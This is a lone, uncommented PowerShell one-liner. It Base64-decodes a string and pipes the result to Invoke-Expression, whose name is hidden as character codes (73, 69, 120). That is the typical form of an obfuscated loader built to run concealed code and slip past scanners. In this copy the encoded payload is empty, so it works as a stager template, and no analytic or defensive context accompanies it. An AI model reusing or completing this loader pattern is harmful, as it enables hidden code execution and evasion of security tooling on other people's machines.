$QXWZY="";$YGJHD=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($QXWZY));$YGJHD|&([char]73+[char]69+[char]120)